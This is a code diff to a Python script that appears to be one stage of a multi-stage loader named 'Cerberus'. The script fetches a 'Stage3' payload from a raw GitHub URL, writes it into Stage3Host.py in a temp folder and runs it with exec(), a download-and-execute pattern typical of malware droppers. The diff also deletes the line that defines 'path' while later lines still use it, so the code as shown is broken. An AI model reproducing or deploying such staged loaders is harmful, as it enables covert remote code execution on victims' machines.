@@ -1,9 +1,8 @@
 import os.path
 import urllib.request
 
-path = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp/Stage3Host.py")
 
-if os.path.isfile(path) == False:
+if os.path.isfile((path + "/Stage3Host.py")) == False:
     file = open('Stage3Host.py', 'a')
     file.close()
 
@@ -14,7 +13,7 @@ with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerber
 
 with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage3.txt") as retrieve:
     data = retrieve.read().decode("utf-8")
-    with open(path, "a+") as file:
+    with open((path + "/Stage3Host.py"), "a+") as file:
         file.write("#" + rN + "\n" + str(data) + "\n" + "#" + rN)
 
-exec(open(path).read()) # Runs stage 3 file
+exec(open(path + "/Stage3Host.py").read()) # Runs stage 3 file
